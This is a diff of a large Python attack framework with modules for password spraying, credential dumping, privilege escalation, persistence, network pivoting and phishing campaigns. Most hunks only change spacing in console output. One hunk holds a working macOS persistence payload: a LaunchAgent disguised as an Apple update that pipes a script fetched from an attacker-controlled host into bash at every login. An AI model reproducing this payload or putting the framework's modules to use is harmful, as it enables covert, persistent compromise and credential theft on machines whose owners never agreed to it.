         result = self._execute_spray_campaign(profile, connector, usernames, passwords)
@@ -12472,7 +12472,7 @@ while True:
         if report_paths:
             print(f"\n{Fore.GREEN}[+] Spray reports saved:{Style.RESET_ALL}")
             for path in report_paths:
-                print(f"   • {path}")
+                print(f" • {path}")
         if not result['successes']:
             print(f"{Fore.YELLOW}[*] No valid credentials identified for provided lists.{Style.RESET_ALL}")
         return result
@@ -12496,7 +12496,7 @@ while True:
                 host, raw_port = raw_target.rsplit(':', 1)
                 port = self._safe_int(raw_port, 22, 1, 65535)
             target = f"{host}:{port}"
-        else:  # mock
+        else: # mock
             target = raw_target or 'mock-target'
             host = 'mock-target'
             port = 0
@@ -12709,33 +12709,33 @@ while True:
         print(f"\n{Fore.CYAN}{'═'*70}{Style.RESET_ALL}")
         print(f"{Fore.CYAN}SPRAY SUMMARY{Style.RESET_ALL}")
         print(f"{Fore.CYAN}{'═'*70}{Style.RESET_ALL}")
-        print(f"{Fore.WHITE} Attempts     : {Fore.CYAN}{summary.attempts}{Style.RESET_ALL}")
-        print(f"{Fore.WHITE} Successes    : {Fore.GREEN}{summary.successes}{Style.RESET_ALL}")
+        print(f"{Fore.WHITE} Attempts : {Fore.CYAN}{summary.attempts}{Style.RESET_ALL}")
+        print(f"{Fore.WHITE} Successes : {Fore.GREEN}{summary.successes}{Style.RESET_ALL}")
         print(f"{Fore.WHITE} Locked users : {Fore.YELLOW}{summary.locked}{Style.RESET_ALL}")
-        print(f"{Fore.WHITE} Duration     : {Fore.CYAN}{summary.duration:.2f}s{Style.RESET_ALL}")
-        print(f"{Fore.WHITE} Throughput   : {Fore.CYAN}{summary.rate:.2f} req/s{Style.RESET_ALL}")
+        print(f"{Fore.WHITE} Duration : {Fore.CYAN}{summary.duration:.2f}s{Style.RESET_ALL}")
+        print(f"{Fore.WHITE} Throughput : {Fore.CYAN}{summary.rate:.2f} req/s{Style.RESET_ALL}")
         if result['stop_reason']:
             print(f"{Fore.YELLOW}[!] Run ended because: {result['stop_reason']}{Style.RESET_ALL}")
         if result['warnings']:
             print(f"{Fore.YELLOW}[*] Warnings:{Style.RESET_ALL}")
             for warning in result['warnings'][:3]:
-                print(f"  - {warning}")
+                print(f" - {warning}")
         if result['errors']:
             print(f"{Fore.YELLOW}[*] Errors:{Style.RESET_ALL}")
             for error in result['errors'][-3:]:
-                print(f"  - {error[:90]}")
+                print(f" - {error[:90]}")
         if result['successes']:
             print(f"\n{Fore.GREEN}[+] Valid credentials{Style.RESET_ALL}")
             for success in result['successes'][:5]:
-                print(f"  {success.username}:{success.password_preview} ({success.service}@{success.target})")
+                print(f" {success.username}:{success.password_preview} ({success.service}@{success.target})")
         if result['lockouts']:
             print(f"\n{Fore.YELLOW}[*] Lockout indicators{Style.RESET_ALL}")
             for username, count in list(result['lockouts'].items())[:5]:
-                print(f"  {username} ({count} events)")
+                print(f" {username} ({count} events)")
         if result['attempt_log']:
             print(f"\n{Fore.BLUE}[*] Recent attempts{Style.RESET_ALL}")
             for entry in result['attempt_log'][-profile['telemetry_tail']:]:
-                print(f"  {entry['username']:<12} {entry['password']:<10} -> {entry['status'].upper()} ({entry['latency']}s)")
+                print(f" {entry['username']:<12} {entry['password']:<10} -> {entry['status'].upper()} ({entry['latency']}s)")
 
     def _export_spray_results(self, profile, result):
         timestamp = int(time.time())
@@ -12774,7 +12774,7 @@ while True:
                     for record in result['successes']:
                         fh.write(f"- {record.username}:{record.password_preview} ({record.service}@{record.target})\n")
                         if record.evidence:
-                            fh.write(f"  Evidence: {record.evidence}\n")
+                            fh.write(f" Evidence: {record.evidence}\n")
                 if result['lockouts']:
                     fh.write("\nLockout Indicators\n------------------\n")
                     for username, count in result['lockouts'].items():
@@ -12973,12 +12973,12 @@ Remediation: {finding['remediation']}
         for title, commands in sections:
             print(f"{Fore.CYAN}{title.upper()}{Style.RESET_ALL}")
             for cmd, description in commands:
-                print(f"  {Fore.GREEN}{cmd:<26}{Fore.WHITE}:: {description}{Style.RESET_ALL}")
+                print(f" {Fore.GREEN}{cmd:<26}{Fore.WHITE}:: {description}{Style.RESET_ALL}")
             print()
 
         domains = "recon | scan | exploit | post | password | wireless | social | network | webapp | report"
         print(f"{Fore.CYAN}PRIMARY DOMAINS{Style.RESET_ALL}")
-        print(f"  {Fore.WHITE}{domains}{Style.RESET_ALL}\n")
+        print(f" {Fore.WHITE}{domains}{Style.RESET_ALL}\n")
 
         recipes = [
             ("Port scan", "show modules recon → use recon/port_scanner → set target/ports → run"),
@@ -12987,7 +12987,7 @@ Remediation: {finding['remediation']}
         ]
         print(f"{Fore.CYAN}FIELD RECIPES{Style.RESET_ALL}")
         for label, steps in recipes:
-            print(f"  ▸ {label}: {Fore.GREEN}{steps}{Style.RESET_ALL}")
+            print(f" ▸ {label}: {Fore.GREEN}{steps}{Style.RESET_ALL}")
         print()
     
     def search_exploits(self, query):
@@ -13000,9 +13000,9 @@ Remediation: {finding['remediation']}
             print(f"{Fore.GREEN}[+] Found {len(results)} exploits:{Style.RESET_ALL}")
             for exploit in results:
                 print(f"\n{Fore.YELLOW}[{exploit['id']}] {exploit['name']}{Style.RESET_ALL}")
-                print(f"  Type: {exploit['type']}")
-                print(f"  Port: {exploit['port']}")
-                print(f"  Description: {exploit['description']}")
+                print(f" Type: {exploit['type']}")
+                print(f" Port: {exploit['port']}")
+                print(f" Description: {exploit['description']}")
         else:
             print(f"{Fore.YELLOW}[*] No exploits found for: {query}{Style.RESET_ALL}")
     
@@ -13133,7 +13133,7 @@ Remediation: {finding['remediation']}
                 status = 'OK' if entry.get('success') else 'ERR'
                 color = Fore.GREEN if entry.get('success') else Fore.RED
                 duration = entry.get('duration', 0.0)
-                print(f"  {idx:02d} {color}[{status}]{Style.RESET_ALL} {entry.get('cmd')} ({duration:.2f}s)")
+                print(f" {idx:02d} {color}[{status}]{Style.RESET_ALL} {entry.get('cmd')} ({duration:.2f}s)")
             return True
         if internal_cmd == 'stats':
             total = len(history)
@@ -13144,7 +13144,7 @@ Remediation: {finding['remediation']}
             failure = total - success
             avg_duration = sum(entry.get('duration', 0.0) for entry in history) / total
             print(f"{Fore.CYAN}[*] Shell command stats{Style.RESET_ALL}")
-            print(f"  Total: {total} | Success: {success} | Failure: {failure} | Avg runtime: {avg_duration:.2f}s")
+            print(f" Total: {total} | Success: {success} | Failure: {failure} | Avg runtime: {avg_duration:.2f}s")
             return True
         if internal_cmd == 'last':
             if not history:
@@ -13217,7 +13217,7 @@ Remediation: {finding['remediation']}
             allowed_preview = ', '.join(sorted(profile['allowlist'])[:8])
             print(f"{Fore.RED}[!] Command '{base_cmd}' not permitted{Style.RESET_ALL}")
             if allowed_preview:
-                print(f"{Fore.BLUE}ℹ  Allowed commands include: {allowed_preview}...{Style.RESET_ALL}")
+                print(f"{Fore.BLUE}ℹ Allowed commands include: {allowed_preview}...{Style.RESET_ALL}")
             return None
         env = self._build_shell_environment(profile['env'])
         start = time.time()
@@ -13282,21 +13282,21 @@ Remediation: {finding['remediation']}
         print(f"\n{Fore.CYAN}{'═'*70}{Style.RESET_ALL}")
         print(f"{Fore.CYAN}SHELL SESSION SUMMARY{Style.RESET_ALL}")
         print(f"{Fore.CYAN}{'═'*70}{Style.RESET_ALL}")
-        print(f"{Fore.WHITE} Session ID        : {Fore.CYAN}{profile['session_id']}{Style.RESET_ALL}")
-        print(f"{Fore.WHITE} Mode              : {Fore.CYAN}{profile['mode']}{Style.RESET_ALL}")
+        print(f"{Fore.WHITE} Session ID : {Fore.CYAN}{profile['session_id']}{Style.RESET_ALL}")
+        print(f"{Fore.WHITE} Mode : {Fore.CYAN}{profile['mode']}{Style.RESET_ALL}")
         print(f"{Fore.WHITE} Working directory : {Fore.CYAN}{profile['cwd']}{Style.RESET_ALL}")
         print(f"{Fore.WHITE} Commands executed : {Fore.CYAN}{total}{Style.RESET_ALL}")
-        print(f"{Fore.WHITE} Successes         : {Fore.GREEN}{successes}{Style.RESET_ALL}")
-        print(f"{Fore.WHITE} Failures          : {Fore.YELLOW}{failures}{Style.RESET_ALL}")
-        print(f"{Fore.WHITE} Total runtime     : {Fore.CYAN}{total_runtime:.2f}s{Style.RESET_ALL}")
+        print(f"{Fore.WHITE} Successes : {Fore.GREEN}{successes}{Style.RESET_ALL}")
+        print(f"{Fore.WHITE} Failures : {Fore.YELLOW}{failures}{Style.RESET_ALL}")
+        print(f"{Fore.WHITE} Total runtime : {Fore.CYAN}{total_runtime:.2f}s{Style.RESET_ALL}")
         if profile['record_transcript']:
-            print(f"{Fore.WHITE} Transcript        : {Fore.CYAN}{profile['transcript_path']}{Style.RESET_ALL}")
+            print(f"{Fore.WHITE} Transcript : {Fore.CYAN}{profile['transcript_path']}{Style.RESET_ALL}")
         if records:
             print(f"\n{Fore.GREEN}[+] Recent commands{Style.RESET_ALL}")
             for record in records[-3:]:
                 status = 'OK' if record.success else 'ERR'
                 color = Fore.GREEN if record.success else Fore.RED
-                print(f"  {color}[{status}]{Style.RESET_ALL} {record.cmd} ({record.duration:.2f}s)")
+                print(f" {color}[{status}]{Style.RESET_ALL} {record.cmd} ({record.duration:.2f}s)")
         return {
             'session_id': profile['session_id'],
             'mode': profile['mode'],
@@ -13315,8 +13315,8 @@ Remediation: {finding['remediation']}
         print(f"{Fore.YELLOW}[*] Mode: {profile['mode']} | Timeout: {profile['timeout']}s | CWD: {profile['cwd']}{Style.RESET_ALL}")
         allowed_preview = ', '.join(sorted(profile['allowlist'])[:8])
         if allowed_preview:
-            print(f"{Fore.BLUE}ℹ  Allowed commands include: {allowed_preview}...{Style.RESET_ALL}")
-        print(f"{Fore.BLUE}ℹ  Built-in commands: history, stats, last, clear_history{Style.RESET_ALL}\n")
+            print(f"{Fore.BLUE}ℹ Allowed commands include: {allowed_preview}...{Style.RESET_ALL}")
+        print(f"{Fore.BLUE}ℹ Built-in commands: history, stats, last, clear_history{Style.RESET_ALL}\n")
         session_data = self._ensure_shell_session(session_id, profile['history_limit'])
         executed_records = []
         summary = None
@@ -13750,19 +13750,19 @@ Remediation: {finding['remediation']}
         print(f"\n{Fore.CYAN}{'═'*70}{Style.RESET_ALL}")
         print(f"{Fore.CYAN}FILE EXPLORER SUMMARY{Style.RESET_ALL}")
         print(f"{Fore.CYAN}{'═'*70}{Style.RESET_ALL}")
-        print(f"{Fore.WHITE} Base path         : {Fore.CYAN}{summary.base_path}{Style.RESET_ALL}")
-        print(f"{Fore.WHITE} Mode              : {Fore.CYAN}{profile['mode']}{Style.RESET_ALL}")
-        print(f"{Fore.WHITE} Entries returned  : {Fore.CYAN}{summary.total_entries}{Style.RESET_ALL}")
-        print(f"{Fore.WHITE} Files / Dirs      : {Fore.CYAN}{summary.files}{Style.RESET_ALL} / {Fore.CYAN}{summary.directories}{Style.RESET_ALL}")
-        print(f"{Fore.WHITE} Total file size   : {Fore.CYAN}{self._format_size(summary.total_size)}{Style.RESET_ALL}")
-        print(f"{Fore.WHITE} Depth reached     : {Fore.CYAN}{summary.depth_reached}{Style.RESET_ALL}")
+        print(f"{Fore.WHITE} Base path : {Fore.CYAN}{summary.base_path}{Style.RESET_ALL}")
+        print(f"{Fore.WHITE} Mode : {Fore.CYAN}{profile['mode']}{Style.RESET_ALL}")
+        print(f"{Fore.WHITE} Entries returned : {Fore.CYAN}{summary.total_entries}{Style.RESET_ALL}")
+        print(f"{Fore.WHITE} Files / Dirs : {Fore.CYAN}{summary.files}{Style.RESET_ALL} / {Fore.CYAN}{summary.directories}{Style.RESET_ALL}")
+        print(f"{Fore.WHITE} Total file size : {Fore.CYAN}{self._format_size(summary.total_size)}{Style.RESET_ALL}")
+        print(f"{Fore.WHITE} Depth reached : {Fore.CYAN}{summary.depth_reached}{Style.RESET_ALL}")
         if summary.truncated:
             print(f"{Fore.YELLOW}[!] Entry limit reached ({profile['max_entries']}){Style.RESET_ALL}")
         if summary.errors:
             print(f"{Fore.YELLOW}[!] Errors recorded: {summary.errors}{Style.RESET_ALL}")
         if entries:
             print(f"\n{Fore.GREEN}[+] Top results{Style.RESET_ALL}")
-            header = f"{'TYPE':<6} {'SIZE':>10}  {'MODIFIED':<19}  NAME"
+            header = f"{'TYPE':<6} {'SIZE':>10} {'MODIFIED':<19} NAME"
             print(header)
             print('-' * len(header))
             preview_count = min(10, len(entries))
@@ -13773,11 +13773,11 @@ Remediation: {finding['remediation']}
                 name_label = entry.name
                 if entry.type == 'dir':
                     name_label += '/'
-                print(f"{type_label:<6} {size_label:>10}  {modified_label:<19}  {name_label}")
+                print(f"{type_label:<6} {size_label:>10} {modified_label:<19} {name_label}")
         if result['errors']:
             print(f"\n{Fore.YELLOW}[!] Explorer warnings{Style.RESET_ALL}")
             for message in result['errors'][:5]:
-                print(f"  - {message}")
+                print(f" - {message}")
 
     def _export_file_explorer_results(self, profile, result):
         timestamp = int(time.time())
@@ -13811,14 +13811,14 @@ Remediation: {finding['remediation']}
                 fh.write(f"Errors: {len(result['errors'])}\n\n")
                 for entry in result['entries'][:50]:
                     fh.write(f"[{entry.type.upper()}] {entry.path}\n")
-                    fh.write(f"  Size: {entry.size} bytes\n")
-                    fh.write(f"  Modified: {self._format_timestamp(entry.modified)}\n")
-                    fh.write(f"  Owner: {entry.owner}:{entry.group}\n")
-                    fh.write(f"  Perms: {entry.permissions}\n")
+                    fh.write(f" Size: {entry.size} bytes\n")
+                    fh.write(f" Modified: {self._format_timestamp(entry.modified)}\n")
+                    fh.write(f" Owner: {entry.owner}:{entry.group}\n")
+                    fh.write(f" Perms: {entry.permissions}\n")
                     if entry.hash:
-                        fh.write(f"  Hash: {entry.hash}\n")
+                        fh.write(f" Hash: {entry.hash}\n")
                     if entry.preview:
-                        fh.write(f"  Preview: {entry.preview[:120]}\n")
+                        fh.write(f" Preview: {entry.preview[:120]}\n")
                     fh.write('\n')
             return [json_path, txt_path]
         except OSError as exc:
@@ -13848,7 +13848,7 @@ Remediation: {finding['remediation']}
         if export_paths:
             print(f"\n{Fore.GREEN}[+] File explorer reports saved:{Style.RESET_ALL}")
             for path in export_paths:
-                print(f"   • {path}")
+                print(f" • {path}")
         return result
     
     def _resolve_privesc_profile(self):
@@ -14272,21 +14272,21 @@ Remediation: {finding['remediation']}
         print(f"\n{Fore.CYAN}{'═'*70}{Style.RESET_ALL}")
         print(f"{Fore.CYAN}PRIVILEGE ESCALATION SUMMARY{Style.RESET_ALL}")
         print(f"{Fore.CYAN}{'═'*70}{Style.RESET_ALL}")
-        print(f"{Fore.WHITE} Session ID      : {Fore.CYAN}{summary.session_id}{Style.RESET_ALL}")
+        print(f"{Fore.WHITE} Session ID : {Fore.CYAN}{summary.session_id}{Style.RESET_ALL}")
         print(f"{Fore.WHITE} Checks executed : {Fore.CYAN}{', '.join(summary.checks_run)}{Style.RESET_ALL}")
-        print(f"{Fore.WHITE} Findings        : {Fore.CYAN}{summary.total_findings}{Style.RESET_ALL}")
-        print(f"{Fore.WHITE} Runtime         : {Fore.CYAN}{summary.runtime:.2f}s{Style.RESET_ALL}")
+        print(f"{Fore.WHITE} Findings : {Fore.CYAN}{summary.total_findings}{Style.RESET_ALL}")
+        print(f"{Fore.WHITE} Runtime : {Fore.CYAN}{summary.runtime:.2f}s{Style.RESET_ALL}")
         if summary.errors:
             print(f"{Fore.YELLOW}[!] Errors recorded: {summary.errors}{Style.RESET_ALL}")
         if findings:
             print(f"\n{Fore.GREEN}[+] Top findings{Style.RESET_ALL}")
             for finding in findings[:5]:
-                print(f"  {Fore.YELLOW}{finding.severity:<6}{Style.RESET_ALL} {finding.category:<12} {finding.title}")
-                print(f"     {finding.description}")
+                print(f" {Fore.YELLOW}{finding.severity:<6}{Style.RESET_ALL} {finding.category:<12} {finding.title}")
+                print(f" {finding.description}")
         if result['errors']:
             print(f"\n{Fore.YELLOW}[!] Check warnings{Style.RESET_ALL}")
             for error in result['errors'][:5]:
-                print(f"  - {error}")
+                print(f" - {error}")
 
     def _export_privesc_results(self, profile, result):
         timestamp = int(time.time())
@@ -14334,7 +14334,7 @@ Remediation: {finding['remediation']}
         if report_paths:
             print(f"\n{Fore.GREEN}[+] Privilege escalation reports saved:{Style.RESET_ALL}")
             for path in report_paths:
-                print(f"   • {path}")
+                print(f" • {path}")
         return result
     
     def _detect_target_os(self, override):
@@ -14795,14 +14795,14 @@ Remediation: {finding['remediation']}
         print(f"\n{Fore.CYAN}{'═'*70}{Style.RESET_ALL}")
         print(f"{Fore.CYAN}CREDENTIAL DUMPER SUMMARY{Style.RESET_ALL}")
         print(f"{Fore.CYAN}{'═'*70}{Style.RESET_ALL}")
-        print(f"{Fore.WHITE} Session ID   : {Fore.CYAN}{summary.session_id}{Style.RESET_ALL}")
-        print(f"{Fore.WHITE} Target OS   : {Fore.CYAN}{summary.target_os}{Style.RESET_ALL}")
-        print(f"{Fore.WHITE} Mode        : {Fore.CYAN}{summary.mode}{Style.RESET_ALL}")
-        print(f"{Fore.WHITE} Artifacts   : {Fore.CYAN}{summary.total_artifacts}{Style.RESET_ALL}")
-        print(f"{Fore.WHITE} Runtime     : {Fore.CYAN}{summary.duration:.2f}s{Style.RESET_ALL}")
+        print(f"{Fore.WHITE} Session ID : {Fore.CYAN}{summary.session_id}{Style.RESET_ALL}")
+        print(f"{Fore.WHITE} Target OS : {Fore.CYAN}{summary.target_os}{Style.RESET_ALL}")
+        print(f"{Fore.WHITE} Mode : {Fore.CYAN}{summary.mode}{Style.RESET_ALL}")
+        print(f"{Fore.WHITE} Artifacts : {Fore.CYAN}{summary.total_artifacts}{Style.RESET_ALL}")
+        print(f"{Fore.WHITE} Runtime : {Fore.CYAN}{summary.duration:.2f}s{Style.RESET_ALL}")
         if summary.categories:
             top = ', '.join(f"{cat}:{count}" for cat, count in list(summary.categories.items())[:4])
-            print(f"{Fore.WHITE} Categories  : {Fore.CYAN}{top}{Style.RESET_ALL}")
+            print(f"{Fore.WHITE} Categories : {Fore.CYAN}{top}{Style.RESET_ALL}")
         if result['warnings']:
             print(f"{Fore.YELLOW}[!] Warnings: {len(result['warnings'])}{Style.RESET_ALL}")
         if result['errors']:
@@ -14810,8 +14810,8 @@ Remediation: {finding['remediation']}
         if result['artifacts']:
             print(f"\n{Fore.GREEN}[+] Notable artifacts{Style.RESET_ALL}")
             for artifact in result['artifacts'][:5]:
-                print(f"  {artifact.confidence.upper():<6} {artifact.category:<12} {artifact.source}")
-                print(f"     {artifact.path}")
+                print(f" {artifact.confidence.upper():<6} {artifact.category:<12} {artifact.source}")
+                print(f" {artifact.path}")
 
     def _export_credential_results(self, profile, result):
         timestamp = int(time.time())
@@ -14865,7 +14865,7 @@ Remediation: {finding['remediation']}
         if report_paths:
             print(f"\n{Fore.GREEN}[+] Credential dump reports saved:{Style.RESET_ALL}")
             for path in report_paths:
-                print(f"   • {path}")
+                print(f" • {path}")
         return result
 
     def _safe_command_template(self, template, params):
@@ -15030,7 +15030,7 @@ Remediation: {finding['remediation']}
                 'description': 'LaunchAgent executing signed payload at login.',
                 'risk': 'high',
                 'commands': [
-                    "cat <<'EOF' > ~/Library/LaunchAgents/com.apple.update.{session}.plist\n<?xml version='1.0' encoding='UTF-8'?>\n<!DOCTYPE plist PUBLIC '-//Apple//DTD PLIST 1.0//EN' 'http://www.apple.com/DTDs/PropertyList-1.0.dtd'>\n<plist version='1.0'>\n<dict>\n    <key>Label</key><string>com.apple.update.{session}</string>\n    <key>ProgramArguments</key>\n    <array><string>/bin/bash</string><string>-c</string><string>curl -fsSL http://{lhost}:{lport}/sync.sh | bash</string></array>\n    <key>RunAtLoad</key><true/>\n    <key>KeepAlive</key><true/>\n</dict>\n</plist>\nEOF",
+                    "cat <<'EOF' > ~/Library/LaunchAgents/com.apple.update.{session}.plist\n<?xml version='1.0' encoding='UTF-8'?>\n<!DOCTYPE plist PUBLIC '-//Apple//DTD PLIST 1.0//EN' 'http://www.apple.com/DTDs/PropertyList-1.0.dtd'>\n<plist version='1.0'>\n<dict>\n <key>Label</key><string>com.apple.update.{session}</string>\n <key>ProgramArguments</key>\n <array><string>/bin/bash</string><string>-c</string><string>curl -fsSL http://{lhost}:{lport}/sync.sh | bash</string></array>\n <key>RunAtLoad</key><true/>\n <key>KeepAlive</key><true/>\n</dict>\n</plist>\nEOF",
                     "launchctl load ~/Library/LaunchAgents/com.apple.update.{session}.plist"
                 ],
                 'cleanup': [
@@ -15108,10 +15108,10 @@ Remediation: {finding['remediation']}
         print(f"\n{Fore.CYAN}{'═'*70}{Style.RESET_ALL}")
         print(f"{Fore.CYAN}PERSISTENCE PLAN SUMMARY{Style.RESET_ALL}")
         print(f"{Fore.CYAN}{'═'*70}{Style.RESET_ALL}")
-        print(f"{Fore.WHITE} Session ID  : {Fore.CYAN}{plan.session_id}{Style.RESET_ALL}")
-        print(f"{Fore.WHITE} Target OS  : {Fore.CYAN}{plan.target_os}{Style.RESET_ALL}")
-        print(f"{Fore.WHITE} Mode       : {Fore.CYAN}{profile['mode']}{Style.RESET_ALL}")
-        print(f"{Fore.WHITE} Methods    : {Fore.CYAN}{', '.join(plan.methods_requested)}{Style.RESET_ALL}")
+        print(f"{Fore.WHITE} Session ID : {Fore.CYAN}{plan.session_id}{Style.RESET_ALL}")
+        print(f"{Fore.WHITE} Target OS : {Fore.CYAN}{plan.target_os}{Style.RESET_ALL}")
+        print(f"{Fore.WHITE} Mode : {Fore.CYAN}{profile['mode']}{Style.RESET_ALL}")
+        print(f"{Fore.WHITE} Methods : {Fore.CYAN}{', '.join(plan.methods_requested)}{Style.RESET_ALL}")
         print(f"{Fore.WHITE} Techniques : {Fore.CYAN}{len(plan.techniques)}{Style.RESET_ALL}")
         if plan.warnings:
             print(f"{Fore.YELLOW}[!] Warnings: {len(plan.warnings)}{Style.RESET_ALL}")
@@ -15119,14 +15119,14 @@ Remediation: {finding['remediation']}
             print(f"{Fore.RED}[!] Errors: {len(plan.errors)}{Style.RESET_ALL}")
         for technique in plan.techniques:
             print(f"\n{Fore.GREEN}[+] {technique.title}{Style.RESET_ALL} ({technique.risk.upper()} - {technique.category})")
-            print(f"    {technique.description}")
-            print(f"    Automation: {technique.automation}")
+            print(f" {technique.description}")
+            print(f" Automation: {technique.automation}")
             for command in technique.commands[:3]:
-                print(f"    $ {command}")
+                print(f" $ {command}")
             if profile['include_cleanup'] and technique.cleanup:
-                print(f"    Cleanup -> {technique.cleanup[0]}")
+                print(f" Cleanup -> {technique.cleanup[0]}")
             if technique.detection:
-                print(f"    Detection hint: {technique.detection[0]}")
+                print(f" Detection hint: {technique.detection[0]}")
 
     def _export_persistence_plan(self, profile, plan):
         timestamp = int(time.time())
@@ -15147,19 +15147,19 @@ Remediation: {finding['remediation']}
                     fh.write(f"Description: {technique.description}\n")
                     fh.write("Commands:\n")
                     for command in technique.commands:
-                        fh.write(f"  - {command}\n")
+                        fh.write(f" - {command}\n")
                     if profile['include_cleanup'] and technique.cleanup:
                         fh.write("Cleanup:\n")
                         for command in technique.cleanup:
-                            fh.write(f"  - {command}\n")
+                            fh.write(f" - {command}\n")
                     if technique.detection:
                         fh.write("Detection:\n")
                         for hint in technique.detection:
-                            fh.write(f"  - {hint}\n")
+                            fh.write(f" - {hint}\n")
                     if technique.prerequisites:
                         fh.write("Prerequisites:\n")
                         for prereq in technique.prerequisites:
-                            fh.write(f"  - {prereq}\n")
+                            fh.write(f" - {prereq}\n")
                     fh.write("\n")
                 if plan.warnings:
                     fh.write("Warnings:\n")
@@ -15233,11 +15233,11 @@ Remediation: {finding['remediation']}
         if report_paths:
             print(f"\n{Fore.GREEN}[+] Persistence plan reports saved:{Style.RESET_ALL}")
             for path in report_paths:
-                print(f"   • {path}")
+                print(f" • {path}")
         if script_paths:
             print(f"{Fore.GREEN}[+] Deployment scripts generated:{Style.RESET_ALL}")
             for path in script_paths:
-                print(f"   • {path}")
+                print(f" • {path}")
         if not plan.techniques:
             print(f"{Fore.YELLOW}[!] No techniques selected; adjust filters and retry.{Style.RESET_ALL}")
         return plan
@@ -15502,24 +15502,24 @@ Remediation: {finding['remediation']}
         print(f"\n{Fore.CYAN}{'═'*70}{Style.RESET_ALL}")
         print(f"{Fore.CYAN}PIVOT PLAN SUMMARY{Style.RESET_ALL}")
         print(f"{Fore.CYAN}{'═'*70}{Style.RESET_ALL}")
-        print(f"{Fore.WHITE} Session ID   : {Fore.CYAN}{plan.session_id}{Style.RESET_ALL}")
-        print(f"{Fore.WHITE} Entry Host   : {Fore.CYAN}{plan.entry_host}{Style.RESET_ALL}")
-        print(f"{Fore.WHITE} Target Net   : {Fore.CYAN}{plan.target_network}{Style.RESET_ALL}")
-        print(f"{Fore.WHITE} Routes       : {Fore.CYAN}{len(plan.routes)}{Style.RESET_ALL}")
+        print(f"{Fore.WHITE} Session ID : {Fore.CYAN}{plan.session_id}{Style.RESET_ALL}")
+        print(f"{Fore.WHITE} Entry Host : {Fore.CYAN}{plan.entry_host}{Style.RESET_ALL}")
+        print(f"{Fore.WHITE} Target Net : {Fore.CYAN}{plan.target_network}{Style.RESET_ALL}")
+        print(f"{Fore.WHITE} Routes : {Fore.CYAN}{len(plan.routes)}{Style.RESET_ALL}")
         if plan.warnings:
             print(f"{Fore.YELLOW}[!] Warnings: {len(plan.warnings)}{Style.RESET_ALL}")
         if plan.errors:
             print(f"{Fore.RED}[!] Errors: {len(plan.errors)}{Style.RESET_ALL}")
         for route in plan.routes:
             print(f"\n{Fore.GREEN}[+] {route.name}{Style.RESET_ALL} ({route.technique.category}/{route.technique.transport})")
-            print(f"    Score: {route.score} | {route.notes}")
-            print(f"    {route.technique.description}")
+            print(f" Score: {route.score} | {route.notes}")
+            print(f" {route.technique.description}")
             for command in route.technique.commands[:3]:
-                print(f"    $ {command}")
+                print(f" $ {command}")
             if route.technique.detection:
-                print(f"    Detection: {route.technique.detection[0]}")
+                print(f" Detection: {route.technique.detection[0]}")
             if route.technique.requirements:
-                print(f"    Req: {route.technique.requirements[0]}")
+                print(f" Req: {route.technique.requirements[0]}")
 
     def _export_pivot_plan(self, profile, plan):
         timestamp = int(time.time())
@@ -15542,15 +15542,15 @@ Remediation: {finding['remediation']}
                     fh.write(f"Description: {route.technique.description}\n")
                     fh.write("Commands:\n")
                     for command in route.technique.commands:
-                        fh.write(f"  - {command}\n")
+                        fh.write(f" - {command}\n")
                     if route.technique.cleanup:
                         fh.write("Cleanup:\n")
                         for command in route.technique.cleanup:
-                            fh.write(f"  - {command}\n")
+                            fh.write(f" - {command}\n")
                     if route.technique.detection:
                         fh.write("Detection:\n")
                         for hint in route.technique.detection:
-                            fh.write(f"  - {hint}\n")
+                            fh.write(f" - {hint}\n")
                     fh.write("\n")
                 if plan.warnings:
                     fh.write("Warnings:\n")
@@ -15625,11 +15625,11 @@ Remediation: {finding['remediation']}
         if report_paths:
             print(f"\n{Fore.GREEN}[+] Pivot plan reports saved:{Style.RESET_ALL}")
             for path in report_paths:
-                print(f"   • {path}")
+                print(f" • {path}")
         if script_paths:
             print(f"{Fore.GREEN}[+] Deployment scripts generated:{Style.RESET_ALL}")
             for path in script_paths:
-                print(f"   • {path}")
+                print(f" • {path}")
         if not plan.routes:
             print(f"{Fore.YELLOW}[!] No pivot routes available for provided filters.{Style.RESET_ALL}")
         return plan
@@ -15651,9 +15651,9 @@ Remediation: {finding['remediation']}
         
         print(f"{Fore.YELLOW}[!] WiFi scanning requires monitor mode and root privileges{Style.RESET_ALL}")
         print(f"{Fore.BLUE}[*] Commands to enable monitor mode:{Style.RESET_ALL}")
-        print(f"{Fore.CYAN}   sudo ifconfig {interface} down{Style.RESET_ALL}")
-        print(f"{Fore.CYAN}   sudo iwconfig {interface} mode monitor{Style.RESET_ALL}")
-        print(f"{Fore.CYAN}   sudo ifconfig {interface} up{Style.RESET_ALL}")
+        print(f"{Fore.CYAN} sudo ifconfig {interface} down{Style.RESET_ALL}")
+        print(f"{Fore.CYAN} sudo iwconfig {interface} mode monitor{Style.RESET_ALL}")
+        print(f"{Fore.CYAN} sudo ifconfig {interface} up{Style.RESET_ALL}")
         
         print(f"\n{Fore.GREEN}[*] WiFi scanner ready (requires root to capture){Style.RESET_ALL}")
     
@@ -15727,7 +15727,7 @@ ignore_broadcast_ssid=0"""
         profile = self._resolve_phishing_profile()
         
         if not profile:
-            print(f"{Fore.RED}[✗] Failed to initialize phishing campaign{Style.RESET_ALL}")
+            print(f"{Fore.RED}[] Failed to initialize phishing campaign{Style.RESET_ALL}")
             return
         
         # Display configuration
@@ -15737,17 +15737,17 @@ ignore_broadcast_ssid=0"""
         campaign = self._initialize_phishing_campaign(profile)
         
         if not campaign:
-            print(f"{Fore.RED}[✗] Campaign initialization failed{Style.RESET_ALL}")
+            print(f"{Fore.RED}[] Campaign initialization failed{Style.RESET_ALL}")
             return
         
         # Load and validate targets
         targets = self._load_phishing_targets(profile, campaign)
         
         if not targets:
-            print(f"{Fore.RED}[✗] No valid targets loaded{Style.RESET_ALL}")
+            print(f"{Fore.RED}[] No valid targets loaded{Style.RESET_ALL}")
             return
         
-        print(f"{Fore.GREEN}[✓] Loaded {len(targets)} valid targets{Style.RESET_ALL}")
+        print(f"{Fore.GREEN}[] Loaded {len(targets)} valid targets{Style.RESET_ALL}")
         
         # Confirm execution
         if not profile['auto_execute']:
@@ -15766,11 +15766,11 @@ ignore_broadcast_ssid=0"""
         # Export reports
         if profile['export_results']:
             report_paths = self._export_phishing_results(profile, campaign, results)
-            print(f"\n{Fore.GREEN}[✓] Reports exported:{Style.RESET_ALL}")
+            print(f"\n{Fore.GREEN}[] Reports exported:{Style.RESET_ALL}")
             for path in report_paths:
-                print(f"   • {path}")
+                print(f" • {path}")
         
-        print(f"\n{Fore.GREEN}[✓] Campaign completed{Style.RESET_ALL}")
